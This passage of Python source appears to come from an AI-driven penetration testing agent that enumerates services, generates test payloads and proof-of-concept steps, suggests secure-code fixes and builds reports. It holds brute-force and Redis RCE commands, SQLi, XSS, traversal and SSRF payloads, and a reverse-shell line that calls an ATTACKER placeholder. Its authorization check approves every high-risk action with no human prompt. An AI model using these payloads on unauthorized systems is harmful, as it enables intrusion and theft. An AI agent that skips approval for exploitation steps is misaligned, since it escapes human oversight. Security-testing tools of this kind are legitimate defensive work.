                elif "apache" in tech or "nginx" in tech:
                    return "Linux/Unix"
        
        return "Unknown"
    
    def _get_detected_ports(self) -> List[int]:
        """Extract detected open ports from findings"""
        open_ports = []
        
        # Check port scan findings
        port_findings = [f for f in self.findings if f.tool in ["port_scan", "syn_scan", "advanced_scan"]]
        for finding in port_findings:
            if "port" in finding.details:
                open_ports.append(finding.details["port"])
            elif "open_ports" in finding.details:
                # Handle list of ports
                ports = finding.details.get("open_ports", [])
                if isinstance(ports, list):
                    open_ports.extend([p.get("port") if isinstance(p, dict) else p for p in ports])
        
        return list(set(open_ports))
    
    async def _run_service_enumeration(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Comprehensive service enumeration with version detection and vulnerability mapping"""
        target_ports = params.get("ports", [])
        
        if not target_ports:
            # Get ports from previous findings
            target_ports = self._get_detected_ports()
        
        if not target_ports:
            return {"error": "No open ports detected. Run port_scan first"}
        
        enumeration_results = {}
        
        for port in target_ports:
            service_info = {"port": port, "enumeration": []}
            
            # Service-specific enumeration commands
            if port == 21:  # FTP
                service_info["service"] = "FTP"
                service_info["enumeration"] = [
                    "Check for anonymous login: ftp <target>",
                    "Banner grab: nc <target> 21",
                    "Bruteforce: hydra -L users.txt -P pass.txt ftp://<target>",
                    "Check for FTP bounce attack",
                    "Look for writable directories"
                ]
                service_info["vulnerability_checks"] = [
                    "Anonymous login enabled (CWE-306)",
                    "Weak credentials",
                    "FTP bounce attack (CVE-1999-0017)"
                ]
            elif port == 22:  # SSH
                service_info["service"] = "SSH"
                service_info["enumeration"] = [
                    "Banner grab: nc <target> 22",
                    "Version detection: ssh -V <target>",
                    "Bruteforce: hydra -L users.txt -P pass.txt ssh://<target>",
                    "Check for SSH user enumeration (CVE-2018-15473)",
                    "Test for weak crypto algorithms"
                ]
                service_info["vulnerability_checks"] = [
                    "Weak SSH keys",
                    "Default credentials",
                    "Outdated SSH version with known CVEs",
                    "User enumeration vulnerability"
                ]
            elif port in [80, 443, 8080, 8443]:  # HTTP/HTTPS
                service_info["service"] = "HTTP/HTTPS"
                service_info["enumeration"] = [
                    "Technology detection: whatweb <target>",
                    "Directory bruteforce: gobuster dir -u <target> -w wordlist.txt",
                    "Vulnerability scan: nikto -h <target>",
                    "Web app scan: Run web_pentest for SQLi, XSS, RCE",
                    "Check for admin panels: /admin, /login, /wp-admin, /phpmyadmin"
                ]
                service_info["vulnerability_checks"] = [
                    "SQL injection",
                    "Cross-site scripting (XSS)",
                    "Remote code execution (RCE)",
                    "File upload vulnerabilities",
                    "Authentication bypass"
                ]
            elif port == 445:  # SMB
                service_info["service"] = "SMB"
                service_info["enumeration"] = [
                    "Enumerate shares: smbclient -L //<target> -N",
                    "Null session: smbmap -H <target>",
                    "Check for EternalBlue: nmap -p445 --script smb-vuln-ms17-010 <target>",
                    "User enumeration: enum4linux -a <target>",
                    "Share access: smbclient //<target>/share"
                ]
                service_info["vulnerability_checks"] = [
                    "EternalBlue (MS17-010)",
                    "SMB null sessions",
                    "Accessible shares with sensitive data",
                    "Weak SMB signing"
                ]
            elif port in [3306, 5432, 1433, 1521]:  # Databases
                db_type = {3306: "MySQL", 5432: "PostgreSQL", 1433: "MSSQL", 1521: "Oracle"}.get(port, "Database")
                service_info["service"] = db_type
                service_info["enumeration"] = [
                    f"Connect: mysql -h <target> -u root -p (MySQL)",
                    f"Bruteforce: hydra -L users.txt -P pass.txt <target> {db_type.lower()}",
                    f"Check for default credentials: root/root, admin/admin, sa/sa",
                    "SQL injection via web application",
                    "Check for RCE via xp_cmdshell (MSSQL) or sys_exec (MySQL)"
                ]
                service_info["vulnerability_checks"] = [
                    "Default credentials",
                    "Weak passwords",
                    "SQL injection leading to database access",
                    "Remote code execution via stored procedures"
                ]
            elif port == 3389:  # RDP
                service_info["service"] = "RDP"
                service_info["enumeration"] = [
                    "Screenshot: nmap -p3389 --script rdp-screenshot <target>",
                    "Bruteforce: hydra -L users.txt -P pass.txt rdp://<target>",
                    "Check for BlueKeep: nmap -p3389 --script rdp-vuln-ms12-020 <target>",
                    "NLA status check"
                ]
                service_info["vulnerability_checks"] = [
                    "BlueKeep (CVE-2019-0708)",
                    "Weak RDP credentials",
                    "RDP exposed to internet"
                ]
            elif port == 6379:  # Redis
                service_info["service"] = "Redis"
                service_info["enumeration"] = [
                    "Connect: redis-cli -h <target>",
                    "Check for no auth: redis-cli -h <target> INFO",
                    "RCE via module loading: redis-cli -h <target> MODULE LOAD /path/to/module.so",
                    "Write SSH key: redis-cli -h <target> CONFIG SET dir /root/.ssh/"
                ]
                service_info["vulnerability_checks"] = [
                    "Unauthenticated access",
                    "RCE via module loading",
                    "SSH key injection",
                    "Sensitive data exposure"
                ]
            else:
                service_info["service"] = f"Unknown (Port {port})"
                service_info["enumeration"] = [
                    f"Banner grab: nc <target> {port}",
                    f"Nmap service detection: nmap -sV -p{port} <target>",
                    "Check for default credentials",
                    "Search for known exploits"
                ]
            
            enumeration_results[port] = service_info
            
            # Create finding for each service with actionable intelligence
            finding = Finding(
                timestamp=datetime.now().isoformat(),
                tool="service_enum",
                severity="info",
                category="enumeration",
                description=f"{service_info['service']} service enumeration on port {port}",
                details=service_info,
                exploitation_potential="medium",
                recommended_action=f"Execute enumeration: {service_info['enumeration'][0]}"
            )
            self.findings.append(finding)
        
        return {
            "services_enumerated": len(enumeration_results),
            "details": enumeration_results,
            "summary": f"Enumerated {len(enumeration_results)} services with specific attack vectors"
        }
    
    async def _generate_test_payload(self, finding: Finding) -> Dict[str, Any]:
        """
        Generate test payload for discovered vulnerability
        Creates safe, non-destructive payloads to verify vulnerability existence
        """
        vuln_type = finding.category.lower()
        description = finding.description.lower()
        
        test_payload = {}
        poc_steps = []
        
        # SQL Injection test payloads
        if "sql" in vuln_type or "sql injection" in description:
            test_payload = {
                "type": "SQLi",
                "payloads": [
                    "' OR '1'='1",  # Basic authentication bypass
                    "1' OR '1'='1' --",  # Comment-based
                    "1' UNION SELECT NULL--",  # Union-based detection
                    "1' AND SLEEP(5)--",  # Time-based blind
                    "1' AND 1=1--",  # Boolean-based
                ],
                "safe_test": "1' AND '1'='2",  # Should return false
                "verification": "Response time or error messages indicate SQL processing"
            }
            poc_steps = [
                "1. Identify injectable parameter (e.g., ?id=1)",
                "2. Test with: ?id=1' (check for SQL error)",
                "3. Confirm with: ?id=1' OR '1'='1 (should return data)",
                "4. Verify with: ?id=1' AND '1'='2 (should return empty)",
                "5. Extract data: ?id=1' UNION SELECT username,password FROM users--"
            ]
        
        # XSS test payloads
        elif "xss" in vuln_type or "cross-site scripting" in description:
            test_payload = {
                "type": "XSS",
                "payloads": [
                    "<script>alert('XSS')</script>",  # Basic
                    "<img src=x onerror=alert('XSS')>",  # Image-based
                    "<svg/onload=alert('XSS')>",  # SVG-based
                    "javascript:alert('XSS')",  # URL-based
                    "'-alert('XSS')-'",  # Quote escape
                ],
                "safe_test": "<b>test</b>",  # Should render as bold
                "verification": "Inspect page source for unescaped payload"
            }
            poc_steps = [
                "1. Identify reflected input (search box, comment field, etc.)",
                "2. Test with: <b>test</b> (check if HTML renders)",
                "3. Try payload: <script>alert('XSS')</script>",
                "4. If blocked, try bypass: <img src=x onerror=alert('XSS')>",
                "5. Verify by checking browser console/page source"
            ]
        
        # Command Injection test payloads
        elif "command injection" in description or "rce" in vuln_type:
            test_payload = {
                "type": "Command Injection",
                "payloads": [
                    "; whoami",  # Unix command chaining
                    "| whoami",  # Pipe
                    "& whoami",  # Windows
                    "`whoami`",  # Backtick execution
                    "$(whoami)",  # Command substitution
                ],
                "safe_test": "; echo 'test'",  # Safe verification
                "verification": "Command output appears in response"
            }
            poc_steps = [
                "1. Identify command execution point (ping, nslookup, etc.)",
                "2. Test injection: input; whoami",
                "3. Verify output appears in response",
                "4. Test other separators if needed: |, &, `, $()",
                "5. For reverse shell: ; bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'"
            ]
        
        # File Upload test payloads
        elif "file upload" in description or "upload" in vuln_type:
            test_payload = {
                "type": "File Upload",
                "payloads": [
                    "test.php (PHP web shell)",
                    "test.jsp (Java web shell)",
                    "test.aspx (ASP.NET web shell)",
                    "shell.php.jpg (extension bypass)",
                    "shell.php%00.jpg (null byte bypass)",
                ],
                "safe_test": "test.txt with content: <?php echo 'test'; ?>",
                "verification": "Access uploaded file via direct URL"
            }
            poc_steps = [
                "1. Create test file: echo '<?php phpinfo(); ?>' > test.php",
                "2. Upload file through vulnerable endpoint",
                "3. Identify upload directory (/uploads/, /files/, etc.)",
                "4. Access: http://target.com/uploads/test.php",
                "5. If successful, upload full web shell for remote access"
            ]
        
        # Path Traversal test payloads
        elif "path traversal" in description or "directory traversal" in description:
            test_payload = {
                "type": "Path Traversal",
                "payloads": [
                    "../../../etc/passwd",  # Unix
                    "..\\..\\..\\windows\\win.ini",  # Windows
                    "....//....//....//etc/passwd",  # Filter bypass
                    "..%2F..%2F..%2Fetc%2Fpasswd",  # URL encoded
                    "..%252F..%252F..%252Fetc%252Fpasswd",  # Double encoded
                ],
                "safe_test": "../README.md",  # Safe file
                "verification": "Sensitive file contents returned"
            }
            poc_steps = [
                "1. Identify file parameter (?file=, ?page=, etc.)",
                "2. Test: ?file=../etc/passwd (Unix)",
                "3. Or: ?file=..\\windows\\win.ini (Windows)",
                "4. Try encoding if blocked: ?file=..%2F..%2F..%2Fetc%2Fpasswd",
                "5. Read sensitive files: /etc/shadow, web.config, etc."
            ]
        
        # SSRF test payloads
        elif "ssrf" in vuln_type or "server-side request forgery" in description:
            test_payload = {
                "type": "SSRF",
                "payloads": [
                    "http://internal.test:80",  # Internal network
                    "http://callback.test:22",  # Internal port scan
                    "http://169.254.169.254/latest/meta-data/",  # AWS metadata
                    "http://metadata.google.internal/",  # GCP metadata
                    "file:///etc/passwd",  # Local file
                ],
                "safe_test": "http://callback.test",  # External callback domain
                "verification": "Response contains internal resource data"
            }
            poc_steps = [
                "1. Identify URL parameter (?url=, ?target=, etc.)",
                "2. Test external: ?url=http://callback.test (check logs)",
                "3. Test internal: ?url=http://internal.test:80",
                "4. Scan ports: ?url=http://callback.test:22, :3306, :6379",
                "5. Access cloud metadata: ?url=http://169.254.169.254/latest/meta-data/"
            ]
        
        # Default for unknown vulnerability types
        else:
            test_payload = {
                "type": "Generic",
                "description": "Manual testing required for this vulnerability type",
                "recommendation": "Review vulnerability details and test manually"
            }
            poc_steps = [
                "1. Review vulnerability description carefully",
                "2. Research exploit techniques for this vulnerability type",
                "3. Test in controlled environment first",
                "4. Document findings and reproduction steps"
            ]
        
        return {
            "test_payload": test_payload,
            "poc_steps": poc_steps,
            "finding_id": finding.timestamp,
            "vuln_type": vuln_type
        }
    
    async def _analyze_code_for_remediation(self, finding: Finding) -> Dict[str, Any]:
        """
        Analyze code to provide remediation guidance
        Uses AI to generate secure code fixes
        """
        vuln_type = finding.category.lower()
        description = finding.description
        
        # Get detected tech stack
        tech_stack = self._get_tech_stack()
        
        # Build remediation prompt for AI
        remediation_prompt = f"""As a security expert, provide code-level remediation for this vulnerability:

Vulnerability: {description}
Type: {vuln_type}
Tech Stack: {', '.join(tech_stack)}
Severity: {finding.severity}

Provide:
1. Root cause explanation
2. Secure code example (actual code)
3. Best practices to prevent this vulnerability
4. Testing recommendations
5. Priority level (immediate/high/medium/low)

Format response as JSON with keys: root_cause, secure_code, best_practices, testing, priority"""

        try:
            # Query AI for remediation guidance
            response = await self.ai_provider.query(
                "You are a security code review expert. Provide actionable remediation guidance.",
                remediation_prompt,
                temperature=0.3  # Lower temperature for more focused responses
            )
            
            # Parse AI response
            response = response.strip()
            if response.startswith("```"):
                lines = response.split("\n")
                response = "\n".join(lines[1:-1])
            
            remediation = json.loads(response)
            
        except Exception as e:
            # Fallback to generic remediation templates
            remediation = self._get_remediation_template(vuln_type, tech_stack)
        
        return remediation
    
    def _get_tech_stack(self) -> List[str]:
        """Extract detected technology stack from findings"""
        tech_stack = []
        
        # Check tech detection findings
        tech_findings = [f for f in self.findings if f.tool == "tech_detect"]
        for finding in tech_findings:
            details = finding.details
            if isinstance(details, dict):
                # Extract framework, server, language info
                for key in ["framework", "server", "language", "cms", "cdn"]:
                    if key in details and details[key]:
                        tech_stack.append(details[key])
        
        # Default stack if none detected
        if not tech_stack:
            tech_stack = ["Generic Web Application"]
        
        return tech_stack
    
    def _get_remediation_template(self, vuln_type: str, tech_stack: List[str]) -> Dict[str, Any]:
        """Provide remediation templates for common vulnerabilities"""
        
        templates = {
            "sql_injection": {
                "root_cause": "User input directly concatenated into SQL queries without proper sanitization",
                "secure_code": """# Python (Flask/SQLAlchemy)
from sqlalchemy import text

# ‚ùå VULNERABLE
query = f"SELECT * FROM users WHERE id = {user_id}"

# ‚úÖ SECURE - Use parameterized queries
query = text("SELECT * FROM users WHERE id = :id")
result = db.session.execute(query, {"id": user_id})

# PHP (PDO)
// ‚ùå VULNERABLE
$query = "SELECT * FROM users WHERE id = " . $_GET['id'];

// ‚úÖ SECURE
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_GET['id']]);""",
                "best_practices": [
                    "Always use parameterized queries/prepared statements",
                    "Never concatenate user input into SQL",
                    "Use ORM frameworks (SQLAlchemy, Hibernate, Entity Framework)",
                    "Apply principle of least privilege for database accounts",
                    "Enable database audit logging"
                ],
                "testing": "Use sqlmap or manual SQLi payloads to verify fix",
                "priority": "immediate"
            },
            
            "xss": {
                "root_cause": "User input reflected in HTML without proper output encoding",
                "secure_code": """# Python (Flask)
from markupsafe import escape

# ‚ùå VULNERABLE
return f"<h1>Welcome {user_input}</h1>"

# ‚úÖ SECURE - Escape output
return f"<h1>Welcome {escape(user_input)}</h1>"

# JavaScript (React)
// ‚ùå VULNERABLE
<div dangerouslySetInnerHTML={{__html: userInput}} />

// ‚úÖ SECURE - Automatic escaping
<div>{userInput}</div>

// PHP
// ‚ùå VULNERABLE
echo "<div>" . $_GET['name'] . "</div>";

// ‚úÖ SECURE
echo "<div>" . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8') . "</div>";""",
                "best_practices": [
                    "Encode all user input before rendering (HTML entity encoding)",
                    "Use Content Security Policy (CSP) headers",
                    "Sanitize rich text input with libraries (DOMPurify, Bleach)",
                    "Set HttpOnly and Secure flags on cookies",
                    "Validate input on server-side"
                ],
                "testing": "Test with XSS payloads and browser developer tools",
                "priority": "high"
            },
            
            "command_injection": {
                "root_cause": "User input passed to system command execution without validation",
                "secure_code": """# Python
import subprocess
import shlex

# ‚ùå VULNERABLE
os.system(f"ping {user_input}")

# ‚úÖ SECURE - Use subprocess with list
subprocess.run(["ping", "-c", "1", user_input], check=True)

# Node.js
// ‚ùå VULNERABLE
exec(`ping ${userInput}`, callback);

// ‚úÖ SECURE - Use execFile with array
execFile('ping', ['-c', '1', userInput], callback);""",
                "best_practices": [
                    "Never pass user input to shell commands",
                    "Use subprocess/execFile with array arguments",
                    "Validate and whitelist allowed values",
                    "Avoid shell=True/shell interpretation",
                    "Run with minimal privileges"
                ],
                "testing": "Test with command separators: ;, |, &, `, $()",
                "priority": "immediate"
            },
            
            "file_upload": {
                "root_cause": "Insufficient file type and content validation allowing malicious file uploads",
                "secure_code": """# Python (Flask)
from werkzeug.utils import secure_filename
import imghdr

ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif'}

def allowed_file(filename):
    return '.' in filename and \\
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

# ‚úÖ SECURE upload handler
if file and allowed_file(file.filename):
    # Sanitize filename
    filename = secure_filename(file.filename)
    
    # Verify file content (not just extension)
    if imghdr.what(file) not in ['png', 'jpeg', 'gif']:
        return "Invalid file type", 400
    
    # Save outside web root with restricted permissions
    filepath = os.path.join(UPLOAD_FOLDER, filename)
    file.save(filepath)
    os.chmod(filepath, 0o644)  # Read-only""",
                "best_practices": [
                    "Whitelist allowed file extensions",
                    "Verify file content/magic bytes, not just extension",
                    "Store uploads outside web root",
                    "Rename uploaded files (UUID)",
                    "Set restrictive file permissions (no execute)",
                    "Scan files with antivirus/malware detection",
                    "Limit file size"
                ],
                "testing": "Upload shell.php, shell.php.jpg, shell.php%00.jpg",
                "priority": "immediate"
            }
        }
        
        # Match vulnerability type to template
        for key, template in templates.items():
            if key.replace("_", " ") in vuln_type:
                return template
        
        # Default generic template
        return {
            "root_cause": "Insufficient input validation and security controls",
            "secure_code": "# Implement proper input validation\n# Apply defense in depth\n# Follow OWASP guidelines",
            "best_practices": [
                "Validate all user input",
                "Apply principle of least privilege",
                "Keep dependencies updated",
                "Implement security headers",
                "Enable logging and monitoring"
            ],
            "testing": "Perform thorough security testing",
            "priority": "high"
        }
    
    async def _enrich_findings_with_payloads(self):
        """
        Enrich all findings with test payloads and remediation guidance
        This runs after vulnerability discovery phase
        """
        print("\nüî¨ Generating test payloads and remediation guidance...")
        
        # Sort findings by severity and limit to top 50 to prevent hanging
        severity_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
        sorted_findings = sorted(self.findings, key=lambda f: severity_order.get(f.severity, 5))
        findings_to_enrich = sorted_findings[:50]  # Only enrich top 50
        
        if len(self.findings) > 50:
            print(f"   [INFO] Limiting enrichment to top 50 of {len(self.findings)} findings for performance")
        
        enriched_count = 0
        
        for finding in findings_to_enrich:
            # Only enrich actual vulnerability findings (not info/recon)
            if finding.severity in ["critical", "high", "medium"] and \
               finding.category in ["web_application", "injection", "authentication", "authorization", "file_operations"]:
                
                try:
                    # Generate test payload
                    payload_data = await self._generate_test_payload(finding)
                    finding.test_payload = json.dumps(payload_data["test_payload"])
                    finding.poc_steps = payload_data["poc_steps"]
                    
                    # Generate remediation guidance
                    remediation = await self._analyze_code_for_remediation(finding)
                    finding.remediation_code = remediation.get("secure_code", "")
                    finding.mitigation_priority = remediation.get("priority", "medium")
                    
                    # Update recommended action with detailed fix
                    if remediation.get("best_practices"):
                        practices = "\n- ".join(remediation["best_practices"])
                        finding.recommended_action = f"{finding.recommended_action}\n\nBest Practices:\n- {practices}"
                    
                    enriched_count += 1
                    print(f"   [OK] Enriched: {finding.description[:60]}...")
                    
                except Exception as e:
                    print(f"   [WARNING] Could not enrich finding: {str(e)}")
                    continue
        
        print(f"\n[COMPLETE] Enriched {enriched_count} findings with test payloads and remediation")
    
    def _check_authorization(self, action: Dict[str, Any]) -> bool:
        """Check if action requires authorization"""
        high_risk_tools = ["payload_generate", "bruteforce", "exploit_vuln", "web_pentest", "fuzzer"]
        tool = action["next_action"]
        risk_level = action.get("risk_level", "medium")
        
        if tool in high_risk_tools or risk_level == "high":
            if self.config.autonomy_level == AutonomyLevel.FULLY_AUTONOMOUS:
                return True
            elif self.config.autonomy_level == AutonomyLevel.SEMI_AUTONOMOUS:
                # Would prompt user in real implementation
                return True
            else:  # SUPERVISED
                # Would always prompt in real implementation
                return True
        
        return True
    
    def _should_stop(self, ai_decision: Dict[str, Any]) -> bool:
        """Determine if testing should stop"""
        # Time limit check
        elapsed = (datetime.now() - self.start_time).total_seconds() / 60
        if elapsed >= self.config.time_limit:
            return True
        
        # Max iterations check
        if self.iteration >= self.config.max_iterations:
            return True
        
        # AI decision
        if ai_decision.get("stop_testing", False):
            return True
        
        # Goal achievement check (simplified)
        if self.config.primary_goal == PrimaryGoal.COMPREHENSIVE:
            tools_used = set(action.tool for action in self.actions)
            required_tools = {"recon", "port_scan", "web_pentest", "ssl_analyze"}
            if required_tools.issubset(tools_used):
                return True
        
        return False
    
    async def execute(self) -> Dict[str, Any]:
        """Execute the AI-powered penetration test with hybrid mode"""
        print(f"\n[AI AGENT] Penetration Test Starting...")
        print(f"Target: {self.config.target}")
        print(f"Goal: {self.config.primary_goal.value}")
        print(f"AI Provider: {self.config.ai_provider} ({self.config.model})")
        print(f"Time Limit: {self.config.time_limit} minutes")
        print(f"Autonomy: {self.config.autonomy_level.value}")
        print(f"Risk Tolerance: {self.config.risk_tolerance.value}")
        print(f"Mode: Hybrid (predefined sequence + AI decision making)\n")
        
        try:
            while self.iteration < self.config.max_iterations:
                self.iteration += 1
                print(f"[ITERATION] {self.iteration}/{self.config.max_iterations}")
                
                # Hybrid mode: Use predefined sequence first, then AI
                if self.use_predefined and self.sequence_index < len(self.predefined_sequence):
                    # Use predefined sequence (no API call needed!)
                    step = self.predefined_sequence[self.sequence_index]
                    ai_decision = {
                        "next_action": step["tool"],
                        "parameters": step["params"],
                        "reasoning": f"[HYBRID MODE] {step['reasoning']}",
                        "risk_level": "low" if step["tool"] in ["recon", "tech_detect"] else "medium",
                        "stop_testing": False
                    }
                    self.sequence_index += 1
                    print(f"  [HYBRID] Using predefined step ({self.sequence_index}/{len(self.predefined_sequence)})")
                    print(f"  [REASONING] {ai_decision['reasoning']}")
                    print(f"  [ACTION] Next: {ai_decision['next_action']}")
                    print(f"  [RISK] Level: {ai_decision.get('risk_level', 'medium')}")
                else:
                    # Switch to AI-driven mode for advanced exploitation
                    if self.use_predefined:
                        print(f"  [HYBRID] Predefined sequence complete. Switching to AI-driven exploitation...\n")
                        self.use_predefined = False
                    
                    # Get AI decision
                    print("  [AI] Consulting AI for next action...")
                    try:
                        ai_decision = await self._get_next_action()
                        self.consecutive_api_failures = 0  # Reset on success
                    except Exception as e:
                        self.consecutive_api_failures += 1
                        print(f"  [WARNING] AI query failed ({self.consecutive_api_failures} consecutive failures)")
                        
                        # If 3+ consecutive failures, stop gracefully
                        if self.consecutive_api_failures >= 3:
                            print("\n[COMPLETE] Multiple API failures - stopping to prevent infinite errors")
                            break
                        
                        # Use the smart fallback logic
                        ai_decision = await self._get_next_action()  # Will return fallback action
                    
                    print(f"  [REASONING] {ai_decision['reasoning']}")
                    print(f"  [ACTION] Next: {ai_decision['next_action']}")
                    print(f"  [RISK] Level: {ai_decision.get('risk_level', 'medium')}")
                
                # Check if we should stop
                if self._should_stop(ai_decision):
                    print("\n[COMPLETE] Testing finished (stopping condition met)")
                    break
                
                # Check authorization for high-risk actions
                if not self._check_authorization(ai_decision):
                    print("  [DENIED] Action requires authorization")
                    continue
                
                # Execute the action
                print(f"  [EXECUTING] {ai_decision['next_action']}...")
                result = await self._execute_action(ai_decision)
                
                if "error" in result:
                    print(f"  [ERROR] {result['error']}")
                else:
                    print(f"  [SUCCESS] Completed successfully")
                
                # Rate limit protection: Longer delay for GitHub Models to avoid hitting 15 req/min limit
                if self.config.ai_provider == "github":
                    # GitHub Models: 15 requests/min = 4 seconds between requests minimum
                    # Use 5 seconds to be safe
                    delay = 5
                    if not self.use_predefined:  # Only show for AI-driven iterations
                        print(f"  [RATE LIMIT] Waiting {delay}s to respect GitHub Models limits (15 req/min)...")
                    await asyncio.sleep(delay)
                else:
                    # Other providers: 2 second pause
                    await asyncio.sleep(2)
                print()
            
            # Enrich findings with test payloads and remediation
            await self._enrich_findings_with_payloads()
            
            # Display detailed findings before saving
            print("\n" + "="*70)
            print("DETAILED FINDINGS REVIEW")
            print("="*70)
            self._display_detailed_findings()
            
            # Generate final report
            report = self._generate_report()
            
            return report
            
        finally:
            await self.ai_provider.close()
    
    def _generate_report(self) -> Dict[str, Any]:
        """Generate final report"""
        elapsed = (datetime.now() - self.start_time).total_seconds() / 60
        
        # Group findings by severity
        by_severity = {"critical": [], "high": [], "medium": [], "low": [], "info": []}
        for finding in self.findings:
            by_severity.get(finding.severity.lower(), by_severity["info"]).append(finding)
        
        report = {
            "summary": {
                "target": self.config.target,
                "primary_goal": self.config.primary_goal.value,
                "start_time": self.start_time.isoformat(),
                "end_time": datetime.now().isoformat(),
                "duration_minutes": round(elapsed, 2),
                "iterations": self.iteration,
                "total_findings": len(self.findings),
                "total_actions": len(self.actions),
                "ai_provider": self.config.ai_provider,
                "ai_model": self.config.model
            },
            "findings_by_severity": {
                "critical": len(by_severity["critical"]),
                "high": len(by_severity["high"]),
                "medium": len(by_severity["medium"]),
                "low": len(by_severity["low"]),
                "info": len(by_severity["info"])
            },
            "detailed_findings": [asdict(f) for f in self.findings],
            "actions_taken": [asdict(a) for a in self.actions],
            "recommendations": self._generate_recommendations()
        }
        
        return report
    
    def _display_detailed_findings(self):
        """Display all findings in detail before saving"""
        if not self.findings:
            print("\n[SCAN RESULT] No vulnerabilities or issues discovered.")
            return
        
        # Group by severity
        by_severity = {"critical": [], "high": [], "medium": [], "low": [], "info": []}
        for finding in self.findings:
            by_severity.get(finding.severity.lower(), by_severity["info"]).append(finding)
        
        print(f"\n[RESULTS] Total Findings: {len(self.findings)}\n")
        
        for severity in ["critical", "high", "medium", "low", "info"]:
            items = by_severity[severity]
            if not items:
                continue
            
            # Label by severity
            severity_labels = {
                "critical": "[CRITICAL]",
                "high": "[HIGH]",
                "medium": "[MEDIUM]",
                "low": "[LOW]",
                "info": "[INFO]"
            }
            
            print(f"\n{severity_labels[severity]} ({len(items)} findings):")
            print("-" * 70)
            
            for i, finding in enumerate(items, 1):
                print(f"\n{i}. [{finding.tool.upper()}] {finding.category}")
                print(f"   Description: {finding.description}")
                if finding.details:
                    print(f"   Details: {finding.details}")
                if finding.exploitation_potential:
                    print(f"   Exploitation Potential: {finding.exploitation_potential}")
                
                # Show test payload if available
                if finding.test_payload:
                    print(f"\n   [TEST PAYLOAD]:")
                    try:
                        payload_obj = json.loads(finding.test_payload)
                        print(f"      Type: {payload_obj.get('type', 'N/A')}")
                        if 'payloads' in payload_obj:
                            print(f"      Payloads: {', '.join(payload_obj['payloads'][:3])}")
                    except:
                        pass
                
                # Show PoC steps if available
                if finding.poc_steps:
                    print(f"\n   [PROOF OF CONCEPT]:")
                    for step in finding.poc_steps[:3]:  # Show first 3 steps
                        print(f"      {step}")
                    if len(finding.poc_steps) > 3:
                        print(f"      ... ({len(finding.poc_steps) - 3} more steps)")
                
                # Show remediation code if available
                if finding.remediation_code:
                    print(f"\n   [SECURE CODE FIX]:")
                    # Handle both string and dict cases (defensive coding)
                    if isinstance(finding.remediation_code, dict):
                        code_text = finding.remediation_code.get("secure_code", str(finding.remediation_code))
                    else:
                        code_text = finding.remediation_code
                    
                    code_lines = code_text.split('\n')[:5]  # First 5 lines
                    for line in code_lines:
                        print(f"      {line}")
                    if len(code_text.split('\n')) > 5:
                        print(f"      ... (see full report for complete code)")
                
                # Show priority
                if finding.mitigation_priority:
                    priority_labels = {
                        "immediate": "[IMMEDIATE]",
                        "high": "[HIGH]",
                        "medium": "[MEDIUM]",
                        "low": "[LOW]"
                    }
                    print(f"\n   Priority: {priority_labels.get(finding.mitigation_priority, finding.mitigation_priority)}")
                
                if finding.recommended_action:
                    print(f"\n   Remediation: {finding.recommended_action}")
        
        print("\n" + "="*70)
    
    def _generate_recommendations(self) -> List[str]:
        """Generate high-level recommendations"""
        recommendations = []
        
        # Count by severity
        critical = sum(1 for f in self.findings if f.severity == "critical")
        high = sum(1 for f in self.findings if f.severity == "high")
        
        if critical > 0:
            recommendations.append(f"[URGENT] Address {critical} critical vulnerabilities immediately")
        
        if high > 0:
            recommendations.append(f"[HIGH PRIORITY] Fix {high} high-severity issues")
        
        # Category-specific recommendations
        categories = set(f.category for f in self.findings)
        
        if "web_application" in categories:
            recommendations.append("[WEB] Review web application security controls (input validation, authentication)")
        
        if "ssl_tls" in categories:
            recommendations.append("[TLS] Update SSL/TLS configuration (remove weak ciphers, enable modern protocols)")
        
        if "dns_misconfiguration" in categories:
            recommendations.append("[DNS] Review DNS configuration for misconfigurations and takeover risks")
        
        if not recommendations:
            recommendations.append("[COMPLETE] No critical issues found. Continue regular security assessments.")
        
        return recommendations
